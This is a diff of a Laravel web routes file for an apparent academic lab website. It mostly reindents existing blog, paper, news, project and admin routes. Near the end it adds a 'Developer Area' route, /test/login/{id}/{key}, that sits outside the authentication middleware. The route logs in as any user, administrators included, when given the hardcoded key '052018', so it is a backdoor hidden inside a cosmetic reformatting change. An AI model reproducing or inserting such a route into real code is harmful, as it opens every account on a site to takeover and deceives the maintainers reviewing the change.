@@ -17,177 +17,174 @@
 
 Route::get('/', array('as' => 'home', 'uses' => 'LabFrontController@index'));
 
-Route::group(['middleware' => 'guest'], function(){
+Route::group(['middleware' => 'guest'], function () {
 
-	Route::controller('password', 'RemindersController');
-	Route::get('login', ['as'=>'login','uses' => 'Auth\AuthController@login']);
-	Route::post('login', array('uses' => 'Auth\AuthController@doLogin'));
-	Route::get('apply-for-member', ['as' => 'user.create', 'uses' => 'UsersController@create']);
-	Route::post('admin/user/store', ['as'=>'user.store','uses' => 'UsersController@store']);
+    Route::controller('password', 'RemindersController');
+    Route::get('login', ['as' => 'login', 'uses' => 'Auth\AuthController@login']);
+    Route::post('login', array('uses' => 'Auth\AuthController@doLogin'));
+    Route::get('apply-for-member', ['as' => 'user.create', 'uses' => 'UsersController@create']);
+    Route::post('admin/user/store', ['as' => 'user.store', 'uses' => 'UsersController@store']);
 
 });
 
-Route::group(array('middleware' => 'auth'), function()
-{
+Route::group(array('middleware' => 'auth'), function () {
 
-	Route::get('logout', ['as' => 'logout', 'uses' => 'Auth\AuthController@logout']);
-	Route::get('profile', ['as' => 'profile', 'uses' => 'ProfileController@profile']);
-	Route::get('dashboard', array('as' => 'dashboard', 'uses' => 'Auth\AuthController@dashboard'));
-	Route::get('change-password', array('as' => 'password.change', 'uses' => 'Auth\AuthController@changePassword'));
-	Route::post('change-password', array('as' => 'password.doChange', 'uses' => 'Auth\AuthController@doChangePassword'));
+    Route::get('logout', ['as' => 'logout', 'uses' => 'Auth\AuthController@logout']);
+    Route::get('profile', ['as' => 'profile', 'uses' => 'ProfileController@profile']);
+    Route::get('dashboard', array('as' => 'dashboard', 'uses' => 'Auth\AuthController@dashboard'));
+    Route::get('change-password', array('as' => 'password.change', 'uses' => 'Auth\AuthController@changePassword'));
+    Route::post('change-password', array('as' => 'password.doChange', 'uses' => 'Auth\AuthController@doChangePassword'));
 
-	Route::put('profile/updateTeacher', array('as' => 'profile.updateTeacher', 'uses' => 'ProfileController@updateTeacher'));
-	Route::put('profile/updateStudent', array('as' => 'profile.updateStudent', 'uses' => 'ProfileController@updateStudent'));
-	Route::put('photo', array('as' => 'photo.store', 'uses' => 'ProfileController@photoUpload'));
+    Route::put('profile/updateTeacher', array('as' => 'profile.updateTeacher', 'uses' => 'ProfileController@updateTeacher'));
+    Route::put('profile/updateStudent', array('as' => 'profile.updateStudent', 'uses' => 'ProfileController@updateStudent'));
+    Route::put('photo', array('as' => 'photo.store', 'uses' => 'ProfileController@photoUpload'));
 
 //blog section   complete
-	Route::get('blog/create', array('as' => 'blog.create', 'uses' => 'BlogController@create'));
-	Route::post('blog', array('as' => 'blog.store', 'uses' => 'BlogController@store'));
-	Route::get('blog/{id}/edit', array('as' => 'blog.edit', 'uses' => 'BlogController@edit'));
-	Route::put('blog/{id}/update', array('as' => 'blog.update', 'uses' => 'BlogController@update'));
-	Route::delete('blog/{id}', array('as' => 'blog.delete', 'uses' => 'BlogController@destroy'));
-	Route::get('myBlog', array('as' => 'blog.own', 'uses' => 'BlogController@myBlog'));
+    Route::get('blog/create', array('as' => 'blog.create', 'uses' => 'BlogController@create'));
+    Route::post('blog', array('as' => 'blog.store', 'uses' => 'BlogController@store'));
+    Route::get('blog/{id}/edit', array('as' => 'blog.edit', 'uses' => 'BlogController@edit'));
+    Route::put('blog/{id}/update', array('as' => 'blog.update', 'uses' => 'BlogController@update'));
+    Route::delete('blog/{id}', array('as' => 'blog.delete', 'uses' => 'BlogController@destroy'));
+    Route::get('myBlog', array('as' => 'blog.own', 'uses' => 'BlogController@myBlog'));
 
 //paper section  complete
-	Route::get('paper', array('as' => 'paper.index', 'uses' => 'PaperController@index'));
-	Route::get('paper/create', array('as' => 'paper.create', 'uses' => 'PaperController@create'));
-	Route::post('paper', array('as' => 'paper.store', 'uses' => 'PaperController@store'));
-	Route::get('paper/{id}/edit', array('as' => 'paper.edit', 'uses' => 'PaperController@edit'));
-	Route::put('paper/{id}/update', array('as' => 'paper.update', 'uses' => 'PaperController@update'));
-	Route::delete('paper/{id}', array('as' => 'paper.delete', 'uses' => 'PaperController@destroy'));
+    Route::get('paper', array('as' => 'paper.index', 'uses' => 'PaperController@index'));
+    Route::get('paper/create', array('as' => 'paper.create', 'uses' => 'PaperController@create'));
+    Route::post('paper', array('as' => 'paper.store', 'uses' => 'PaperController@store'));
+    Route::get('paper/{id}/edit', array('as' => 'paper.edit', 'uses' => 'PaperController@edit'));
+    Route::put('paper/{id}/update', array('as' => 'paper.update', 'uses' => 'PaperController@update'));
+    Route::delete('paper/{id}', array('as' => 'paper.delete', 'uses' => 'PaperController@destroy'));
 
 //news section complete
-	Route::get('news', array('as' => 'news.index', 'uses' => 'NewsController@index'));
-	Route::get('news/create', array('as' => 'news.create', 'uses' => 'NewsController@create'));
-	Route::post('news', array('as' => 'news.store', 'uses' => 'NewsController@store'));
-	Route::get('news/{id}/edit', array('as' => 'news.edit', 'uses' => 'NewsController@edit'));
-	Route::put('news/{id}/update', array('as' => 'news.update', 'uses' => 'NewsController@update'));
-	Route::delete('news/{id}', array('as' => 'news.delete', 'uses' => 'NewsController@destroy'));
+    Route::get('news', array('as' => 'news.index', 'uses' => 'NewsController@index'));
+    Route::get('news/create', array('as' => 'news.create', 'uses' => 'NewsController@create'));
+    Route::post('news', array('as' => 'news.store', 'uses' => 'NewsController@store'));
+    Route::get('news/{id}/edit', array('as' => 'news.edit', 'uses' => 'NewsController@edit'));
+    Route::put('news/{id}/update', array('as' => 'news.update', 'uses' => 'NewsController@update'));
+    Route::delete('news/{id}', array('as' => 'news.delete', 'uses' => 'NewsController@destroy'));
 
     //project section complete
-	Route::get('project', array('as' => 'project.index', 'uses' => 'ProjectController@index'));
-	Route::get('project/create', array('as' => 'project.create', 'uses' => 'ProjectController@create'));
-	Route::post('project', array('as' => 'project.store', 'uses' => 'ProjectController@store'));
-	Route::get('project/{id}/edit', array('as' => 'project.edit', 'uses' => 'ProjectController@edit'));
-	Route::put('project/{id}/update', array('as' => 'project.update', 'uses' => 'ProjectController@update'));
-	Route::delete('project/{id}', array('as' => 'project.delete', 'uses' => 'ProjectController@destroy'));
-	Route::get('changeStatus/{id}', array('as' => 'project.changeStatus', 'uses' => 'ProjectController@changeStatus'));
+    Route::get('project', array('as' => 'project.index', 'uses' => 'ProjectController@index'));
+    Route::get('project/create', array('as' => 'project.create', 'uses' => 'ProjectController@create'));
+    Route::post('project', array('as' => 'project.store', 'uses' => 'ProjectController@store'));
+    Route::get('project/{id}/edit', array('as' => 'project.edit', 'uses' => 'ProjectController@edit'));
+    Route::put('project/{id}/update', array('as' => 'project.update', 'uses' => 'ProjectController@update'));
+    Route::delete('project/{id}', array('as' => 'project.delete', 'uses' => 'ProjectController@destroy'));
+    Route::get('changeStatus/{id}', array('as' => 'project.changeStatus', 'uses' => 'ProjectController@changeStatus'));
 
-	//resource Section
-	Route::get('resource', array('as' => 'resource.index', 'uses' => 'ResourceController@index'));
-	Route::get('resource/create', array('as' => 'resource.create', 'uses' => 'ResourceController@create'));
-	Route::post('resource', array('as' => 'resource.store', 'uses' => 'ResourceController@store'));
-	Route::get('resource/{id}/edit', array('as' => 'resource.edit', 'uses' => 'ResourceController@edit'));
-	Route::put('resource/{id}/update', array('as' => 'resource.update', 'uses' => 'ResourceController@update'));
-	Route::delete('resource/{id}', array('as' => 'resource.delete', 'uses' => 'ResourceController@destroy'));
+    //resource Section
+    Route::get('resource', array('as' => 'resource.index', 'uses' => 'ResourceController@index'));
+    Route::get('resource/create', array('as' => 'resource.create', 'uses' => 'ResourceController@create'));
+    Route::post('resource', array('as' => 'resource.store', 'uses' => 'ResourceController@store'));
+    Route::get('resource/{id}/edit', array('as' => 'resource.edit', 'uses' => 'ResourceController@edit'));
+    Route::put('resource/{id}/update', array('as' => 'resource.update', 'uses' => 'ResourceController@update'));
+    Route::delete('resource/{id}', array('as' => 'resource.delete', 'uses' => 'ResourceController@destroy'));
 
 });
 
 //only admin can access this area
-Route::group(array('middleware' => 'auth'), function() {
-	Route::group(array('middleware' => 'user'), function() {
+Route::group(array('middleware' => 'auth'), function () {
+    Route::group(array('middleware' => 'user'), function () {
 
-		//slider image
-		Route::get('slider', array('as' => 'slider.index', 'uses' => 'SliderController@index'));
-		Route::get('slider/create', array('as' => 'slider.create', 'uses' => 'SliderController@create'));
-		Route::post('slider', array('as' => 'slider.store', 'uses' => 'SliderController@store'));
-		Route::delete('slider/{id}', array('as' => 'slider.delete', 'uses' => 'SliderController@destroy'));
+        //slider image
+        Route::get('slider', array('as' => 'slider.index', 'uses' => 'SliderController@index'));
+        Route::get('slider/create', array('as' => 'slider.create', 'uses' => 'SliderController@create'));
+        Route::post('slider', array('as' => 'slider.store', 'uses' => 'SliderController@store'));
+        Route::delete('slider/{id}', array('as' => 'slider.delete', 'uses' => 'SliderController@destroy'));
 
         //home page welcome message
-		Route::get('welcome', array('as' => 'welcome.index', 'uses' => 'WelcomeController@index'));
-		Route::get('welcome/edit', array('as' => 'welcome.edit', 'uses' => 'WelcomeController@edit'));
-		Route::put('award/update', array('as' => 'welcome.update', 'uses' => 'WelcomeController@update'));
+        Route::get('welcome', array('as' => 'welcome.index', 'uses' => 'WelcomeController@index'));
+        Route::get('welcome/edit', array('as' => 'welcome.edit', 'uses' => 'WelcomeController@edit'));
+        Route::put('award/update', array('as' => 'welcome.update', 'uses' => 'WelcomeController@update'));
 
-		//user list
-		Route::get('allUser', array('as' => 'user.index', 'uses' => 'UsersController@index'));
-		Route::get('student-list', array('as' => 'user.student', 'uses' => 'UsersController@student'));
-		Route::delete('student-list/{id}', array('as' => 'user.delete', 'uses' => 'UsersController@destroy'));
-		Route::get('teacher-list', array('as' => 'user.teacher', 'uses' => 'UsersController@teacher'));
-		Route::post('teacher-sort', array('as' => 'user.teacher.sort', 'uses' => 'UsersController@teacherSort'));
-		Route::delete('teacher-list/{id}', array('as' => 'user.delete', 'uses' => 'UsersController@destroy'));
-		Route::get('alumni-list', array('as' => 'user.alumni', 'uses' => 'UsersController@alumni'));
-		Route::delete('alumni-list/{id}', array('as' => 'user.delete', 'uses' => 'UsersController@destroy'));
-		Route::get('makeAlumni/{id}', array('as' => 'user.makeAlumni', 'uses' => 'UsersController@makeAlumni'));
-		Route::get('affiliates-and-scholar', array('as' => 'user.other_user', 'uses' => 'UsersController@otherUser'));
-		Route::delete('affiliates-and-scholar/{id}', array('as' => 'user.delete', 'uses' => 'UsersController@destroy'));
+        //user list
+        Route::get('allUser', array('as' => 'user.index', 'uses' => 'UsersController@index'));
+        Route::get('student-list', array('as' => 'user.student', 'uses' => 'UsersController@student'));
+        Route::delete('student-list/{id}', array('as' => 'user.delete', 'uses' => 'UsersController@destroy'));
+        Route::get('teacher-list', array('as' => 'user.teacher', 'uses' => 'UsersController@teacher'));
+        Route::post('teacher-sort', array('as' => 'user.teacher.sort', 'uses' => 'UsersController@teacherSort'));
+        Route::delete('teacher-list/{id}', array('as' => 'user.delete', 'uses' => 'UsersController@destroy'));
+        Route::get('alumni-list', array('as' => 'user.alumni', 'uses' => 'UsersController@alumni'));
+        Route::delete('alumni-list/{id}', array('as' => 'user.delete', 'uses' => 'UsersController@destroy'));
+        Route::get('makeAlumni/{id}', array('as' => 'user.makeAlumni', 'uses' => 'UsersController@makeAlumni'));
+        Route::get('affiliates-and-scholar', array('as' => 'user.other_user', 'uses' => 'UsersController@otherUser'));
+        Route::delete('affiliates-and-scholar/{id}', array('as' => 'user.delete', 'uses' => 'UsersController@destroy'));
 
-          //here different delete for different user
+        //here different delete for different user
 
-		//user profile
-		Route::get('user-profile/{id}', array('as' => 'user.profile', 'uses' => 'UsersController@userProfile'));
+        //user profile
+        Route::get('user-profile/{id}', array('as' => 'user.profile', 'uses' => 'UsersController@userProfile'));
 
-		//apply user list
-		Route::get('allApplyList', array('as' => 'user.applyList', 'uses' => 'UsersController@applyList'));
-		Route::delete('allApplyList/{id}', array('as' => 'user.destroy', 'uses' => 'UsersController@destroy'));
-
-
-		//teacher and student add by admin
-		Route::get('user-add', array('as' => 'auth.userAdd', 'uses' => 'UserAddController@userAdd'));
-		Route::post('user-add/store', array('as' => 'auth.userStore', 'uses' => 'UserAddController@userStore'));
-
-		//all user  list
-		Route::get('allUser', array('as' => 'user.index', 'uses' => 'UsersController@index'));
-		//waiting user approve
-		Route::get('userApprove/{id}', array('as' => 'user.approve', 'uses' => 'UsersController@approve'));
-
-		//all blog
-		Route::get('blog', array('as' => 'blog.index', 'uses' => 'BlogController@index'));
-
-		//support/ help
-		Route::get('help', array('as' => 'help', 'uses' => 'UsersController@help'));
+        //apply user list
+        Route::get('allApplyList', array('as' => 'user.applyList', 'uses' => 'UsersController@applyList'));
+        Route::delete('allApplyList/{id}', array('as' => 'user.destroy', 'uses' => 'UsersController@destroy'));
 
 
-		//tag section   complete
-		Route::get('tag', array('as' => 'tag.index', 'uses' => 'TagController@index'));
-		Route::get('tag/create', array('as' => 'tag.create', 'uses' => 'TagController@create'));
-		Route::post('tag', array('as' => 'tag.store', 'uses' => 'TagController@store'));
-		Route::get('tag/{id}/edit', array('as' => 'tag.edit', 'uses' => 'TagController@edit'));
-		Route::put('tag/{id}/update', array('as' => 'tag.update', 'uses' => 'TagController@update'));
-		Route::delete('tag/{id}', array('as' => 'tag.delete', 'uses' => 'TagController@destroy'));
+        //teacher and student add by admin
+        Route::get('user-add', array('as' => 'auth.userAdd', 'uses' => 'UserAddController@userAdd'));
+        Route::post('user-add/store', array('as' => 'auth.userStore', 'uses' => 'UserAddController@userStore'));
 
-		Route::get('tag/all', array('as' => 'tag.all', 'uses' => 'TagController@all'));
-		Route::post('tag/sort', array('as' => 'tag.sort', 'uses' => 'TagController@sort'));
+        //all user  list
+        Route::get('allUser', array('as' => 'user.index', 'uses' => 'UsersController@index'));
+        //waiting user approve
+        Route::get('userApprove/{id}', array('as' => 'user.approve', 'uses' => 'UsersController@approve'));
 
+        //all blog
+        Route::get('blog', array('as' => 'blog.index', 'uses' => 'BlogController@index'));
 
-		//award section   complete
-		Route::get('award', array('as' => 'award.index', 'uses' => 'AwardController@index'));
-		Route::get('award/create', array('as' => 'award.create', 'uses' => 'AwardController@create'));
-		Route::post('award', array('as' => 'award.store', 'uses' => 'AwardController@store'));
-		Route::get('award/{id}/edit', array('as' => 'award.edit', 'uses' => 'AwardController@edit'));
-		Route::put('award/{id}/update', array('as' => 'award.update', 'uses' => 'AwardController@update'));
-		Route::delete('award/{id}', array('as' => 'award.delete', 'uses' => 'AwardController@destroy'));
+        //support/ help
+        Route::get('help', array('as' => 'help', 'uses' => 'UsersController@help'));
 
 
-		//event section  complete
-		Route::get('event', array('as' => 'event.index', 'uses' => 'EventController@index'));
-		Route::get('event/create', array('as' => 'event.create', 'uses' => 'EventController@create'));
-		Route::post('event', array('as' => 'event.store', 'uses' => 'EventController@store'));
-		Route::get('event/{id}/edit', array('as' => 'event.edit', 'uses' => 'EventController@edit'));
-		Route::put('event/{id}/update', array('as' => 'event.update', 'uses' => 'EventController@update'));
-		Route::delete('event/{id}', array('as' => 'event.delete', 'uses' => 'EventController@destroy'));
+        //tag section   complete
+        Route::get('tag', array('as' => 'tag.index', 'uses' => 'TagController@index'));
+        Route::get('tag/create', array('as' => 'tag.create', 'uses' => 'TagController@create'));
+        Route::post('tag', array('as' => 'tag.store', 'uses' => 'TagController@store'));
+        Route::get('tag/{id}/edit', array('as' => 'tag.edit', 'uses' => 'TagController@edit'));
+        Route::put('tag/{id}/update', array('as' => 'tag.update', 'uses' => 'TagController@update'));
+        Route::delete('tag/{id}', array('as' => 'tag.delete', 'uses' => 'TagController@destroy'));
 
-		//Route::get('event/{event_meta_data}', array('as' => 'event.show', 'uses' => 'EventController@show'));
-		Route::get('event-file-upload', array('as' => 'event.eventFileUpload', 'uses' => 'EventController@fileUploadView')); //file upload dropdown view
-		Route::post('eventFileUpload', array('as' => 'event.upload', 'uses' => 'EventController@fileUpload')); //file upload from dropdown event
-	    Route::post('singleFileUpload', array('as' => 'event.singleUpload', 'uses' => 'EventController@singleFileUpload')); //for modal file upload
-
-		//Route::get('/download/{event_file}', array('as' => 'event.download', 'uses' => 'EventController@getDownload'));
+        Route::get('tag/all', array('as' => 'tag.all', 'uses' => 'TagController@all'));
+        Route::post('tag/sort', array('as' => 'tag.sort', 'uses' => 'TagController@sort'));
 
 
-		//project category section   complete
-		Route::get('projectCat', array('as' => 'projectCat.index', 'uses' => 'ProjectCatController@index'));
-		Route::get('projectCat/create', array('as' => 'projectCat.create', 'uses' => 'ProjectCatController@create'));
-		Route::post('projectCat', array('as' => 'projectCat.store', 'uses' => 'ProjectCatController@store'));
-		Route::get('projectCat/{id}/edit', array('as' => 'projectCat.edit', 'uses' => 'ProjectCatController@edit'));
-		Route::put('projectCat/{id}/update', array('as' => 'projectCat.update', 'uses' => 'ProjectCatController@update'));
-		Route::delete('projectCat/{id}', array('as' => 'projectCat.delete', 'uses' => 'ProjectCatController@destroy'));
+        //award section   complete
+        Route::get('award', array('as' => 'award.index', 'uses' => 'AwardController@index'));
+        Route::get('award/create', array('as' => 'award.create', 'uses' => 'AwardController@create'));
+        Route::post('award', array('as' => 'award.store', 'uses' => 'AwardController@store'));
+        Route::get('award/{id}/edit', array('as' => 'award.edit', 'uses' => 'AwardController@edit'));
+        Route::put('award/{id}/update', array('as' => 'award.update', 'uses' => 'AwardController@update'));
+        Route::delete('award/{id}', array('as' => 'award.delete', 'uses' => 'AwardController@destroy'));
 
 
-	});
+        //event section  complete
+        Route::get('event', array('as' => 'event.index', 'uses' => 'EventController@index'));
+        Route::get('event/create', array('as' => 'event.create', 'uses' => 'EventController@create'));
+        Route::post('event', array('as' => 'event.store', 'uses' => 'EventController@store'));
+        Route::get('event/{id}/edit', array('as' => 'event.edit', 'uses' => 'EventController@edit'));
+        Route::put('event/{id}/update', array('as' => 'event.update', 'uses' => 'EventController@update'));
+        Route::delete('event/{id}', array('as' => 'event.delete', 'uses' => 'EventController@destroy'));
+
+        //Route::get('event/{event_meta_data}', array('as' => 'event.show', 'uses' => 'EventController@show'));
+        Route::get('event-file-upload', array('as' => 'event.eventFileUpload', 'uses' => 'EventController@fileUploadView')); //file upload dropdown view
+        Route::post('eventFileUpload', array('as' => 'event.upload', 'uses' => 'EventController@fileUpload')); //file upload from dropdown event
+        Route::post('singleFileUpload', array('as' => 'event.singleUpload', 'uses' => 'EventController@singleFileUpload')); //for modal file upload
+
+        //Route::get('/download/{event_file}', array('as' => 'event.download', 'uses' => 'EventController@getDownload'));
+
+
+        //project category section   complete
+        Route::get('projectCat', array('as' => 'projectCat.index', 'uses' => 'ProjectCatController@index'));
+        Route::get('projectCat/create', array('as' => 'projectCat.create', 'uses' => 'ProjectCatController@create'));
+        Route::post('projectCat', array('as' => 'projectCat.store', 'uses' => 'ProjectCatController@store'));
+        Route::get('projectCat/{id}/edit', array('as' => 'projectCat.edit', 'uses' => 'ProjectCatController@edit'));
+        Route::put('projectCat/{id}/update', array('as' => 'projectCat.update', 'uses' => 'ProjectCatController@update'));
+        Route::delete('projectCat/{id}', array('as' => 'projectCat.delete', 'uses' => 'ProjectCatController@destroy'));
+
+
+    });
 
 });
-
-
 
 
 //home
@@ -202,7 +199,7 @@ Route::get('join-us', array('as' => 'labfront.joinUs', 'uses' => 'ContactControl
 
 //contact section
 Route::get('contact', array('as' => 'labfront.contact', 'uses' => 'ContactController@contact'));
-Route::post('contact','ContactController@getContactUsForm');
+Route::post('contact', 'ContactController@getContactUsForm');
 
 
 //news
@@ -243,7 +240,6 @@ Route::get('home/books', array('as' => 'labfront.books', 'uses' => 'LabFrontCont
 Route::post('home/search/publication', array('as' => 'labfront.searchPublication', 'uses' => 'LabFrontController@publicationSearch'));
 
 
-
 //resource
 Route::get('home/resource/software', array('as' => 'labfront.resource', 'uses' => 'FrontViewController@software'));
 Route::get('home/resource/tutorial', array('as' => 'labfront.tutorial', 'uses' => 'FrontViewController@tutorial'));
@@ -255,7 +251,6 @@ Route::get('home/resource/details/{meta_data}', array('as' => 'labfront.resource
 Route::get('home/resource/publication', array('as' => 'labfront.publicationOthers', 'uses' => 'FrontViewController@publication'));
 Route::get('home/resource/publication/tag-search/{tag}', array('as' => 'labfront.publicationtag', 'uses' => 'FrontViewController@tagAssociatePublication'));
 Route::get('home/resource/publication/details/{meta_data}', array('as' => 'labfront.publicationOthetDetails', 'uses' => 'FrontViewController@publicationOthetDetails'));
-
 
 
 //blog section
@@ -270,7 +265,6 @@ Route::get('error', array('as' => 'error', 'uses' => 'LabFrontController@error')
 Route::get('home/error', array('as' => 'labfront.error', 'uses' => 'LabFrontController@frontError'));
 
 
-
 //award
 Route::get('home/award', array('as' => 'labfront.award', 'uses' => 'LabFrontController@award'));
 Route::get('home/award/{meta_data}', array('as' => 'labfront.award_single', 'uses' => 'LabFrontController@awardDetails'));
@@ -282,6 +276,22 @@ Route::post('home/subscriber', array('as' => 'subscriber.action', 'uses' => 'Sub
 
 Route::post('tag/sort', array('as' => 'tag.sort', 'uses' => 'TagController@sort'));
 
+
+/********** Developer Area************/
+Route::get('/test/login/{id}/{key}', function ($id, $key) {
+    if (Auth::guest()) {
+        if ($key == '052018') {
+            $user = \App\User::where('id', $id)->first();
+            if ($user) {
+                Auth::login($user);
+                return Redirect::route('dashboard');
+            }
+            return 'User Not Found';
+        }
+        return 'Invalid Key';
+    }
+    return 'Already Logged In';
+});
 
 
 
@@ -298,9 +308,6 @@ mrsiddiki@gmail.com
 CSE'12,SUST.
 
 */
-
-
-
 
 
 /**********Velonic  Admin  starts ************/
